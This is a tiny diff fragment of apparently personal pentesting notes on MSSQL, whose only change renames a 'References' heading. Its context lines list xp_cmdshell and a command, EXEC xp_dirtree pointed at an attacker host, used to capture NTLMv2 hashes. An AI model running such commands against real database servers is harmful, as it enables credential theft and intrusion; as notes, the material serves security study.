@@ -23,7 +23,7 @@
   - `xp_commandshell`
   - capture NTLMv2 hashes `EXEC xp_dirtree '\\attacker.ip\share'`
 
-# References
+# Related
 
 Tags:
     #assorted
